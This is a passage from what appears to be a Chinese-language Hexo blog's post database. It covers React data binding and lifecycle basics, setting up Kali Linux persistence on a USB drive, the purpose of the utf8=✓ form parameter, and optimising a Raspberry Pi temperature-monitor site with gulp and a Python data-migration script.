title=\"数据绑定\"></a>数据绑定</h1><p>众所周知，Angular是双向数据绑定的，并且引以为豪，因为更容易维护与理解。</p>\n<p>但是双向数据绑定也带来了许多问题，会在些其他功能的时候莫名其妙出现很多bug。</p>\n<p>React是单向数据绑定的，是非常稳定的做法，但是也存在一些问题，就是在操作其他组件的时候，对于数据流的处理，显得异常困难。</p>\n<p>在React中，数据绑定仅仅需要在<code>render</code>中写<code>{数据绑定}</code>，而非像Angular一样，两边都要设置，一定情况下讲，这是比较方便的。</p>\n<h1 id=\"数据模型\"><a href=\"#数据模型\" class=\"headerlink\" title=\"数据模型\"></a>数据模型</h1><h2 id=\"state\"><a href=\"#state\" class=\"headerlink\" title=\"state\"></a>state</h2><p>话说回来，React的每一个组件的实质是什么？状态机（State Machines），在React的每一个组件里，通过更新<code>this.state</code>，再通过<code>render()</code>进行渲染，React会自动把最新的状态渲染到网页上。</p>\n<p>举个栗子🌰<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">DateSelectorComponent</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">constructor</span>(props) &#123;</div><div class=\"line\">    <span class=\"keyword\">super</span>(props);</div><div class=\"line\">    <span class=\"keyword\">let</span> todaydate = <span class=\"keyword\">this</span>.showLocale(<span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>());</div><div class=\"line\">     <span class=\"keyword\">this</span>.state = &#123;</div><div class=\"line\">         <span class=\"attr\">timenow</span>: todaydate,</div><div class=\"line\">         <span class=\"attr\">showCalendar</span>: <span class=\"literal\">false</span></div><div class=\"line\">    &#125;</div><div class=\"line\">            <span class=\"keyword\">return</span>(</div><div class=\"line\">            <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></div><div class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">Input</span> <span class=\"attr\">icon</span>=<span class=\"string\">'calendar'</span> <span class=\"attr\">iconPosition</span>=<span class=\"string\">'left'</span> <span class=\"attr\">readOnly</span> <span class=\"attr\">onClick</span>=<span class=\"string\">&#123;this.showCalendar&#125;</span> <span class=\"attr\">value</span>=<span class=\"string\">&#123;this.state.timenow&#125;</span> <span class=\"attr\">ref</span>=<span class=\"string\">\"inputbox\"</span>/&gt;</span></div><div class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">ButtonComponent</span> /&gt;</span></div><div class=\"line\">            &#123;CalendarComponent&#125;</div><div class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div><div class=\"line\">        )</div><div class=\"line\">&#125;</span></div></pre></td></tr></table></figure></p>\n<p>通过这样的方式，我就设置了state的默认初始值，默认日历选择器是不出现的，而今天的日期是今天日期，这很正常。然后在将所谓的值渲染到Dom上。</p>\n<h2 id=\"props\"><a href=\"#props\" class=\"headerlink\" title=\"props\"></a>props</h2><p>React的数据流是单向的，是自上向下的层级传递的，props可以对固定的数据进行传递。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">HelloMessage</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</div><div class=\"line\">  render( </div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>Hello &#123;this.props.name&#125;<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span>;</div><div class=\"line\">    )</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MainPage</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</div><div class=\"line\">render()&#123;</div><div class=\"line\"> <span class=\"keyword\">return</span>(</div><div class=\"line\">  <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">HelloMessage</span> <span class=\"attr\">name</span>=<span class=\"string\">\"John\"</span> /&gt;</span></div><div class=\"line\">  )</div><div class=\"line\"> &#125;</div><div class=\"line\">&#125;</span></div></pre></td></tr></table></figure>\n<p>在这种情况下，子组件会自动读取出父组件传递过来的<code>props</code>值John，并快速的渲染在页面上。</p>\n<h2 id=\"到底谁是谁\"><a href=\"#到底谁是谁\" class=\"headerlink\" title=\"到底谁是谁\"></a>到底谁是谁</h2><p><code>state</code>和<code>props</code>看起来很相似，其实是完全不同的东西。</p>\n<table>\n<thead>\n<tr>\n<th>问题</th>\n<th><em>props</em></th>\n<th><em>state</em></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>可以从父组件得到初始值吗？</td>\n<td>可以</td>\n<td>可以</td>\n<td></td>\n</tr>\n<tr>\n<td>可以被父组件改变值吗？</td>\n<td>可以</td>\n<td>不可以</td>\n<td></td>\n</tr>\n<tr>\n<td>可以设置组件内部的初始值吗？</td>\n<td>可以</td>\n<td>可以</td>\n<td></td>\n</tr>\n<tr>\n<td>可以改变组件内部的初始值吗？</td>\n<td>不可以</td>\n<td>可以</td>\n<td></td>\n</tr>\n<tr>\n<td>可以设置子组件的初始值吗？</td>\n<td>可以</td>\n<td>可以</td>\n<td></td>\n</tr>\n<tr>\n<td>可以改变子组件的初始值吗？</td>\n<td>可以</td>\n<td>不可以</td>\n</tr>\n</tbody>\n</table>\n<p>按照我的个人理解，<code>props</code>是静态的，存入不变量，比如 购物车里的 商品名称、价格；<code>state</code>是动态的，存入随时变化的量，比如 用户购买商品的总价，购买数目。</p>\n<p>从操作的角度上讲，<code>props</code>是单向传递的，会一直被传递到子组件，而<code>state</code>更倾向于自身，只能改变自身的值。</p>\n<h1 id=\"获取Dom\"><a href=\"#获取Dom\" class=\"headerlink\" title=\"获取Dom\"></a>获取Dom</h1><p><code>this.refs</code>是react的重要组成之一，通过该方法可以快速高效的获取Dom。</p>\n<p>例如，在JSX代码中这样写道<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">ref</span>=<span class=\"string\">\"myInput\"</span> /&gt;</span></div></pre></td></tr></table></figure></p>\n<p>便可以通过<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">this</span>.refs.myInput.value</div></pre></td></tr></table></figure></p>\n<p>命令获取该Input下的dom属性的value值，非常方便。</p>\n<h1 id=\"生命周期\"><a href=\"#生命周期\" class=\"headerlink\" title=\"生命周期\"></a>生命周期</h1><p>组件都是有生命周期的，生命周期内，<code>props</code>和<code>state</code>改变会导致React自动用Diff算法重新渲染页面。那么生命周期到底都有哪些呢？</p>\n<p>大体上分为三类：</p>\n<ul>\n<li>挂载： 组件被插入到DOM中。</li>\n<li>更新： 组件被重新渲染，查明DOM是否应该刷新。</li>\n<li>移除： 组件从DOM中移除。</li>\n</ul>\n<p>从流程上讲，是这样的：</p>\n<p><strong>挂载期：</strong></p>\n<p>getInitialState() –&gt;&gt; componentWillMount() –&gt;&gt; render() –&gt;&gt; componentDidMount()</p>\n<p><strong>更新期：</strong></p>\n<p>componentWillReceiveProps() –&gt;&gt; shouldComponentUpdate() –&gt;&gt; componentWillUpdate render() –&gt;&gt; componentDidUpdate()</p>\n<p><strong>移除期：</strong></p>\n<p>componentWillUnmount()</p>\n<h2 id=\"挂载\"><a href=\"#挂载\" class=\"headerlink\" title=\"挂载\"></a>挂载</h2><p><strong>componentWillMount()</strong>： 在初次渲染之前执行一次，最早的执行点</p>\n<p><strong>componentDidMount()</strong>： 在初次渲染之后执行，比较常用，比如持续执行某事件：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">componentDidMount()&#123;</div><div class=\"line\"> setInterval(<span class=\"keyword\">this</span>.loadData(<span class=\"keyword\">this</span>.state.date),<span class=\"number\">1000</span>);</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<h2 id=\"更新\"><a href=\"#更新\" class=\"headerlink\" title=\"更新\"></a>更新</h2><p><strong>componentWillReceiveProps()</strong>： 在组件接收到新的 <code>props</code> 的时候调用。在初始化渲染的时候，该方法不会调用。</p>\n<p><strong>shouldComponentUpdate()</strong>： 在接收到新的 <code>props</code> 或者 <code>state</code>，将要渲染之前调用。</p>\n<p><strong>componentWillUpdate()</strong>： 在接收到新的 props 或者 state 之前立刻调用。</p>\n<p><strong>componentDidUpdate()</strong>： 在组件的更新已经同步到 DOM 中之后立刻被调用。</p>\n<h2 id=\"移除\"><a href=\"#移除\" class=\"headerlink\" title=\"移除\"></a>移除</h2><p><strong>componentWillUnmount()</strong>： 在组件从 DOM 中移除的时候立刻被调用。</p>\n<h1 id=\"Flux\"><a href=\"#Flux\" class=\"headerlink\" title=\"Flux\"></a>Flux</h1><p>React是MVC中V的一部分，而Flux则是M和C的部分，Flux是单向数据流，符合React的核心思想，不过，Flux并不完善，是一个很松散的架构。</p>\n<ul>\n<li>Dispatcher： 处理动作分发，维护 Store 之间的依赖关系</li>\n<li>Store： 数据和逻辑部分</li>\n<li>View： React 组件，这一层可以看作 controller-views，作为视图同时响应用户交互</li>\n<li>Action： 提供给 Dispatcher 传递数据给 Store</li>\n</ul>\n<p><img src=\"/content/images/react/3.png\" alt=\"\"></p>\n<h1 id=\"Redux\"><a href=\"#Redux\" class=\"headerlink\" title=\"Redux\"></a>Redux</h1><p><img src=\"/content/images/react/5.jpeg\" alt=\"\"></p>\n<p>Flux把总架构都搭好了，可是实现起来并不容易，因为Flux并没有强大的API，只是一种纯粹的思想实现，而Redux是Flux的“升级版”，把各个部分更加方便的实现起来。</p>\n<p>此部分未完待续</p>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>我觉得React给前端开发带来了一种全新的思想，那就是以JS为中心，一种全新的世界。</p>\n<p>网页不再是网页，而是像工程一样，一块块搭建起来的，拆下来，搬上去都很容易，似的前端再也不是那个凌乱拼凑的年代。</p>\n<p>我想任何一种编程语言，无论是解释性、脚本、编译语言都逃离不了这个全新的年代，就是组件化，大家似乎都在不同方向发展，但实际上，确实一样的。</p>\n<h1 id=\"相关阅读\"><a href=\"#相关阅读\" class=\"headerlink\" title=\"相关阅读\"></a>相关阅读</h1><p><a href=\"http://www.infoq.com/cn/articles/react-dom-diff\">深入浅出React（四）：虚拟DOM Diff算法解析</a></p>\n<p><a href=\"http://bbs.reactnative.cn/topic/15/react-react-native-%E7%9A%84es5-es6%E5%86%99%E6%B3%95%E5%AF%B9%E7%85%A7%E8%A1%A8/2\">React/React Native 的ES5 ES6写法对照表</a></p>\n<p><a href=\"https://www.cllgeek.com/archives/544\">React组件声明周期过程说明</a></p>\n"},{"title":"把KALI放到U盘里","id":"16","updated":"2016-08-25T18:29:38.000Z","date":"2016-08-25T18:26:45.000Z","_content":"\n步骤1：进入 bios设置U盘启动，保存并启动电脑\n\n步骤2：在启动选择画面中，选第一个“kali linux(686-pae)”。\n<!-- more --> \n步骤3：进入kali桌面后 打开命令行，输入gparted，在弹出的窗口程序的右上角选择对应你U盘容量的磁盘。把第二个分区unmount后，将此区格式化成 ext4文件系统，同时把分区名(Label)改成 persistence ，同时记下分区列表里面第二个分区的分区名 例如我的是 /dev/sdb2。\n\n关掉gparted ，在命令行里输入以下命令：\n\n```bash\nmkdir /mnt/usb\nmount /dev/sdb2 /mnt/usb\necho \"/ union\" >> /mnt/usb/persistence.conf\numount /mnt/usb\n```","source":"_posts/把KALI放到U盘里.md","raw":"---\ntitle: 把KALI放到U盘里\ntags: 'Linux'\npermalink: ba-kalifang-dao-upan-li\nid: 16\nupdated: '2016-08-25 19:29:38'\ndate: 2016-08-25 19:26:45\n---\n\n步骤1：进入 bios设置U盘启动，保存并启动电脑\n\n步骤2：在启动选择画面中，选第一个“kali linux(686-pae)”。\n<!-- more --> \n步骤3：进入kali桌面后 打开命令行，输入gparted，在弹出的窗口程序的右上角选择对应你U盘容量的磁盘。把第二个分区unmount后，将此区格式化成 ext4文件系统，同时把分区名(Label)改成 persistence ，同时记下分区列表里面第二个分区的分区名 例如我的是 /dev/sdb2。\n\n关掉gparted ，在命令行里输入以下命令：\n\n```bash\nmkdir /mnt/usb\nmount /dev/sdb2 /mnt/usb\necho \"/ union\" >> /mnt/usb/persistence.conf\numount /mnt/usb\n```","slug":"ba-kalifang-dao-upan-li","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xp600365es5z3yzxs7e","content":"<p>步骤1：进入 bios设置U盘启动，保存并启动电脑</p>\n<p>步骤2：在启动选择画面中，选第一个“kali linux(686-pae)”。<br><a id=\"more\"></a><br>步骤3：进入kali桌面后 打开命令行，输入gparted，在弹出的窗口程序的右上角选择对应你U盘容量的磁盘。把第二个分区unmount后，将此区格式化成 ext4文件系统，同时把分区名(Label)改成 persistence ，同时记下分区列表里面第二个分区的分区名 例如我的是 /dev/sdb2。</p>\n<p>关掉gparted ，在命令行里输入以下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">mkdir /mnt/usb</div><div class=\"line\">mount /dev/sdb2 /mnt/usb</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"/ union\"</span> &gt;&gt; /mnt/usb/persistence.conf</div><div class=\"line\">umount /mnt/usb</div></pre></td></tr></table></figure>","excerpt":"<p>步骤1：进入 bios设置U盘启动，保存并启动电脑</p>\n<p>步骤2：在启动选择画面中，选第一个“kali linux(686-pae)”。<br>","more":"<br>步骤3：进入kali桌面后 打开命令行，输入gparted，在弹出的窗口程序的右上角选择对应你U盘容量的磁盘。把第二个分区unmount后，将此区格式化成 ext4文件系统，同时把分区名(Label)改成 persistence ，同时记下分区列表里面第二个分区的分区名 例如我的是 /dev/sdb2。</p>\n<p>关掉gparted ，在命令行里输入以下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">mkdir /mnt/usb</div><div class=\"line\">mount /dev/sdb2 /mnt/usb</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"/ union\"</span> &gt;&gt; /mnt/usb/persistence.conf</div><div class=\"line\">umount /mnt/usb</div></pre></td></tr></table></figure>"},{"title":"揭秘utf8=✓背后的小秘密","date":"2017-02-17T16:51:18.000Z","header-img":"/content/images/f2e/post-bg-js-version.jpg","_content":"\n你可能和我一样疑惑，为什么github等网站，在POST数据的时候，经常带有`utf8=✓`字符，显然这种方式看起来很难以接受，因为Unicode编码错误的话会导致很多问题，毕竟用户的浏览器是不一样的。\n\n为什么不用`utf8=true`来代替呢？\n\n答案恰恰相反！\n\n`utf8=✓`就是为了让浏览器在POST数据时强制使用utf-8的编码方式，进而在后端代码中无需考虑字符串编码转换问题，以免带来困扰。\n\n在IE8，或者更早的IE浏览器里，在POST数据时，会尽可能的POST以Latin-1编码方式的字符串，这给后端带来了巨大的兼容性的困扰，但是你一旦在POST数据中包含了✓这样的Unicode字符，就会自动用uft8的编码方式发送字符串。\n\n是不是很有用的小技巧呢？\n\n本文翻译自:[Is the use of “utf8=✓” preferable to “utf8=true”?](http://softwareengineering.stackexchange.com/questions/168751/is-the-use-of-utf8-preferable-to-utf8-true)","source":"_posts/揭秘utf8-✓背后的小秘密.md","raw":"---\ntitle: 揭秘utf8=✓背后的小秘密\ndate: 2017-02-17 16:51:18\npermalink: utf8true\ntags: Web\ncategories: Web\nheader-img: \"/content/images/f2e/post-bg-js-version.jpg\"\n---\n\n你可能和我一样疑惑，为什么github等网站，在POST数据的时候，经常带有`utf8=✓`字符，显然这种方式看起来很难以接受，因为Unicode编码错误的话会导致很多问题，毕竟用户的浏览器是不一样的。\n\n为什么不用`utf8=true`来代替呢？\n\n答案恰恰相反！\n\n`utf8=✓`就是为了让浏览器在POST数据时强制使用utf-8的编码方式，进而在后端代码中无需考虑字符串编码转换问题，以免带来困扰。\n\n在IE8，或者更早的IE浏览器里，在POST数据时，会尽可能的POST以Latin-1编码方式的字符串，这给后端带来了巨大的兼容性的困扰，但是你一旦在POST数据中包含了✓这样的Unicode字符，就会自动用uft8的编码方式发送字符串。\n\n是不是很有用的小技巧呢？\n\n本文翻译自:[Is the use of “utf8=✓” preferable to “utf8=true”?](http://softwareengineering.stackexchange.com/questions/168751/is-the-use-of-utf8-preferable-to-utf8-true)","slug":"utf8true","published":1,"updated":"2017-03-08T19:05:11.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xp700395es5xck3yl9k","content":"<p>你可能和我一样疑惑，为什么github等网站，在POST数据的时候，经常带有<code>utf8=✓</code>字符，显然这种方式看起来很难以接受，因为Unicode编码错误的话会导致很多问题，毕竟用户的浏览器是不一样的。</p>\n<p>为什么不用<code>utf8=true</code>来代替呢？</p>\n<p>答案恰恰相反！</p>\n<p><code>utf8=✓</code>就是为了让浏览器在POST数据时强制使用utf-8的编码方式，进而在后端代码中无需考虑字符串编码转换问题，以免带来困扰。</p>\n<p>在IE8，或者更早的IE浏览器里，在POST数据时，会尽可能的POST以Latin-1编码方式的字符串，这给后端带来了巨大的兼容性的困扰，但是你一旦在POST数据中包含了✓这样的Unicode字符，就会自动用uft8的编码方式发送字符串。</p>\n<p>是不是很有用的小技巧呢？</p>\n<p>本文翻译自:<a href=\"http://softwareengineering.stackexchange.com/questions/168751/is-the-use-of-utf8-preferable-to-utf8-true\" target=\"_blank\" rel=\"external\">Is the use of “utf8=✓” preferable to “utf8=true”?</a></p>\n","excerpt":"","more":"<p>你可能和我一样疑惑，为什么github等网站，在POST数据的时候，经常带有<code>utf8=✓</code>字符，显然这种方式看起来很难以接受，因为Unicode编码错误的话会导致很多问题，毕竟用户的浏览器是不一样的。</p>\n<p>为什么不用<code>utf8=true</code>来代替呢？</p>\n<p>答案恰恰相反！</p>\n<p><code>utf8=✓</code>就是为了让浏览器在POST数据时强制使用utf-8的编码方式，进而在后端代码中无需考虑字符串编码转换问题，以免带来困扰。</p>\n<p>在IE8，或者更早的IE浏览器里，在POST数据时，会尽可能的POST以Latin-1编码方式的字符串，这给后端带来了巨大的兼容性的困扰，但是你一旦在POST数据中包含了✓这样的Unicode字符，就会自动用uft8的编码方式发送字符串。</p>\n<p>是不是很有用的小技巧呢？</p>\n<p>本文翻译自:<a href=\"http://softwareengineering.stackexchange.com/questions/168751/is-the-use-of-utf8-preferable-to-utf8-true\">Is the use of “utf8=✓” preferable to “utf8=true”?</a></p>\n"},{"title":"树莓派实时温度湿度监测 优化后续","date":"2016-11-17T23:46:21.000Z","_content":"\n树莓派这个项目已经过去了两月了，一直没有维护，直到我到了英国后发现，在英国连接北京的树莓派网速堪忧，只有100kb/s，每次想查看家里的温度情况，都要等待很长时间才能加载出来，有时候会丢包，这让我很不爽，于是我决定小小的优化一下。\n<!-- more --> \n\n# 优化css js\n之前写的css与js一直没有压缩，这次决定用gulp压缩一下\n\n安装 `gulp`\n```\nnpm install -g gulp \n```\n安装 `gulp-uglify` 模块\n```\nnpm install gulp-uglify\n```\n安装 `gulp-minify-css` 模块\n```\nnpm install gulp-minify-css\n```\n压缩源：\n```\nasset/dist/js\nasset/dist/css\n```\n\n目标：\n```\nasset/js\nasset/css\n```\n\n好的 我们可以开始写`gulpfile.js`文件了\n```javascript\n// 获取 gulp\nvar gulp = require('gulp')\n\n// 获取 uglify 模块（用于压缩 JS）\nvar uglify = require('gulp-uglify')\n// 获取 minify-css 模块（用于压缩 CSS）\nvar minifyCSS = require('gulp-minify-css')\n\n// 压缩 js 文件\n// 在命令行使用 gulp script 启动此任务\ngulp.task('script', function() {\n    // 1. 找到文件\n    gulp.src('asset/dist/js/*.js')\n    // 2. 压缩文件\n        .pipe(uglify())\n    // 3. 另存压缩后的文件\n        .pipe(gulp.dest('asset/js'))\n})\n// 压缩 css 文件\n// 在命令行使用 gulp css 启动此任务\ngulp.task('css', function () {\n    // 1. 找到文件\n    gulp.src('asset/dist/css/*.css')\n    // 2. 压缩文件\n        .pipe(minifyCSS())\n    // 3. 另存为压缩文件\n        .pipe(gulp.dest('asset/css'))\n})\n\n// 在命令行使用 gulp auto 启动此任务\ngulp.task('auto', function () {\n    // 监听文件修改，当文件被修改则执行 script 任务\n    gulp.watch('js/*.js', ['script'])\n    gulp.watch('css/*.css', ['css'])\n})\n\n\n// 使用 gulp.task('default') 定义默认任务\n// 在命令行使用 gulp 启动 script 任务和 auto 任务\ngulp.task('default', ['script', 'css' , 'auto'])\n```\n\n执行gulp即可进行自动压缩及监听任务\n\n# 结构优化\n这是原有的结构\n\n前端：Semantic UI + eCharts + JQuery Datapicker\n\n数据： json(时间)\n\n后端：Python + Apache\n\n后端的python程序负责测温度和测湿度，并生成json数据，为了保证事实性，python程序一直在读写相同的json文件，每一分钟读写一次，造成了json文件的比较大，大概有68KB，在前端是通过ajax加载的json文件，如果网速很慢的话，必然会造成很长时间的延迟。\n\n为了解决这个问题，首先第一步就是减小json文件大小。设计了一个解决方案是，以前的前端已经可以加载每小时数据和每分钟数据，不过小时和分钟的数据是通过在js中忽略加载实现的。\n\n而现在采用新的方案，在data数据目录下，分别建立两个目录。\n\n```\ndata/min\ndata/hour\n```\n\n数据： json(min) / json(hour) \n\nmin的数据专门用于保存min,hour专门用于保存hour，为了解决旧数据迁移问题，首先先将内容移动到min目录下，在根目录下写了一个python小程序，执行挑选出hour数据并且迁移。\n\n\n```python\n#!/usr/bin/python\nimport sys\nimport time\nimport json\nimport os\nimport string\n\ndef jsonRead(path,topath,name):\n    pathfile = path + '/' + name\n    topathfile = topath + '/' + name\n    if os.path.exists(pathfile):\n        file =open(pathfile,\"r\")\n        data = json.loads(file.read().decode('utf-8'))\n        i = 1\n        jsonWrite(data[0],topathfile)\n        for v in data:\n            i = i + 1\n            if(i%60==0):\n                jsonWrite(v,topathfile)\n        file.close()\n    else:\n        print 'unable to open ' + pathfile + 'file'\ndef jsonWrite(data,pathfile):\n    if os.path.exists(pathfile):\n      file =open(pathfile,\"rb+\")\n      file.seek(-1,os.SEEK_END)\n      file.truncate()\n      file.write(\",\")\n      json.dump(data,file)\n      file.write(\"]\")\n      file.close()\n      print 'succes: '+ pathfile\n    else:\n      file =open(pathfile,\"w\")\n      file.write(\"[\")\n      json.dump(data,file)\n      file.write(\"]\")\n      file.close()\n\ndir = 'web/data/min'\ndist = 'web/data/hour'\nfiles = os.listdir(dir)\n\nfor root, dirs, files in os.walk(dir):\n    for name in files:\n        jsonRead(dir,dist,name)\n\n```\n与此同时也需要修改 前端js 与 后端python\n具体代码在 [项目地址](https://github.com/yfgeek/rpi-TempRuntime/)，不贴了。\n\n最后，经过优化，速度大概提升了5倍，前端获取的json文件为1KB。\n\n后续还会增加季度数据统计，等待数据量大一点的时候方便做数据统计工作。\n","source":"_posts/树莓派实时温度湿度监测 优化后续.md","raw":"---\ntitle: 树莓派实时温度湿度监测 优化后续\ndate: 2016-11-17 23:46:21\ntags: 'Raspberry'\ncategories: 'Raspberry'\npermalink: opt-rpi-project\n---\n\n树莓派这个项目已经过去了两月了，一直没有维护，直到我到了英国后发现，在英国连接北京的树莓派网速堪忧，只有100kb/s，每次想查看家里的温度情况，都要等待很长时间才能加载出来，有时候会丢包，这让我很不爽，于是我决定小小的优化一下。\n<!-- more --> \n\n# 优化css js\n之前写的css与js一直没有压缩，这次决定用gulp压缩一下\n\n安装 `gulp`\n```\nnpm install -g gulp \n```\n安装 `gulp-uglify` 模块\n```\nnpm install gulp-uglify\n```\n安装 `gulp-minify-css` 模块\n```\nnpm install gulp-minify-css\n```\n压缩源：\n```\nasset/dist/js\nasset/dist/css\n```\n\n目标：\n```\nasset/js\nasset/css\n```\n\n好的 我们可以开始写`gulpfile.js`文件了\n```javascript\n// 获取 gulp\nvar gulp = require('gulp')\n\n// 获取 uglify 模块（用于压缩 JS）\nvar uglify = require('gulp-uglify')\n// 获取 minify-css 模块（用于压缩 CSS）\nvar minifyCSS = require('gulp-minify-css')\n\n// 压缩 js 文件\n// 在命令行使用 gulp script 启动此任务\ngulp.task('script', function() {\n    // 1. 找到文件\n    gulp.src('asset/dist/js/*.js')\n    // 2. 压缩文件\n        .pipe(uglify())\n    // 3. 另存压缩后的文件\n        .pipe(gulp.dest('asset/js'))\n})\n// 压缩 css 文件\n// 在命令行使用 gulp css 启动此任务\ngulp.task('css', function () {\n    // 1. 找到文件\n    gulp.src('asset/dist/css/*.css')\n    // 2. 压缩文件\n        .pipe(minifyCSS())\n    // 3. 另存为压缩文件\n        .pipe(gulp.dest('asset/css'))\n})\n\n// 在命令行使用 gulp auto 启动此任务\ngulp.task('auto', function () {\n    // 监听文件修改，当文件被修改则执行 script 任务\n    gulp.watch('js/*.js', ['script'])\n    gulp.watch('css/*.css', ['css'])\n})\n\n\n// 使用 gulp.task('default') 定义默认任务\n// 在命令行使用 gulp 启动 script 任务和 auto 任务\ngulp.task('default', ['script', 'css' , 'auto'])\n```\n\n执行gulp即可进行自动压缩及监听任务\n\n# 结构优化\n这是原有的结构\n\n前端：Semantic UI + eCharts + JQuery Datapicker\n\n数据： json(时间)\n\n后端：Python + Apache\n\n后端的python程序负责测温度和测湿度，并生成json数据，为了保证事实性，python程序一直在读写相同的json文件，每一分钟读写一次，造成了json文件的比较大，大概有68KB，在前端是通过ajax加载的json文件，如果网速很慢的话，必然会造成很长时间的延迟。\n\n为了解决这个问题，首先第一步就是减小json文件大小。设计了一个解决方案是，以前的前端已经可以加载每小时数据和每分钟数据，不过小时和分钟的数据是通过在js中忽略加载实现的。\n\n而现在采用新的方案，在data数据目录下，分别建立两个目录。\n\n```\ndata/min\ndata/hour\n```\n\n数据： json(min) / json(hour) \n\nmin的数据专门用于保存min,hour专门用于保存hour，为了解决旧数据迁移问题，首先先将内容移动到min目录下，在根目录下写了一个python小程序，执行挑选出hour数据并且迁移。\n\n\n```python\n#!/usr/bin/python\nimport sys\nimport time\nimport json\nimport os\nimport string\n\ndef jsonRead(path,topath,name):\n    pathfile = path + '/' + name\n    topathfile = topath + '/' + name\n    if os.path.exists(pathfile):\n        file =open(pathfile,\"r\")\n        data = json.loads(file.read().decode('utf-8'))\n        i = 1\n        jsonWrite(data[0],topathfile)\n        for v in data:\n            i = i + 1\n            if(i%60==0):\n                jsonWrite(v,topathfile)\n        file.close()\n    else:\n        print 'unable to open ' + pathfile + 'file'\ndef jsonWrite(data,pathfile):\n    if os.path.exists(pathfile):\n      file =open(pathfile,\"rb+\")\n      file.seek(-1,os.SEEK_END)\n      file.truncate()\n      file.write(\",\")\n      json.dump(data,file)\n      file.write(\"]\")\n      file.close()\n      print 'succes: '+ pathfile\n    else:\n      file =open(pathfile,\"w\")\n      file.write(\"[\")\n      json.dump(data,file)\n      file.write(\"]\")\n      file.close()\n\ndir = 'web/data/min'\ndist = 'web/data/hour'\nfiles = os.listdir(dir)\n\nfor root, dirs, files in os.walk(dir):\n    for name in files:\n        jsonRead(dir,dist,name)\n\n```\n与此同时也需要修改 前端js 与 后端python\n具体代码在 [项目地址](https://github.com/yfgeek/rpi-TempRuntime/)，不贴了。\n\n最后，经过优化，速度大概提升了5倍，前端获取的json文件为1KB。\n\n后续还会增加季度数据统计，等待数据量大一点的时候方便做数据统计工作。\n","slug":"opt-rpi-project","published":1,"updated":"2017-03-08T19:05:11.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xp9003d5es5owkh73tb","content":"<p>树莓派这个项目已经过去了两月了，一直没有维护，直到我到了英国后发现，在英国连接北京的树莓派网速堪忧，只有100kb/s，每次想查看家里的温度情况，都要等待很长时间才能加载出来，有时候会丢包，这让我很不爽，于是我决定小小的优化一下。<br><a id=\"more\"></a> </p>\n<h1 id=\"优化css-js\"><a href=\"#优化css-js\" class=\"headerlink\" title=\"优化css js\"></a>优化css js</h1><p>之前写的css与js一直没有压缩，这次决定用gulp压缩一下</p>\n<p>安装 <code>gulp</code><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">npm install -g gulp</div></pre></td></tr></table></figure></p>\n<p>安装 <code>gulp-uglify</code> 模块<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">npm install 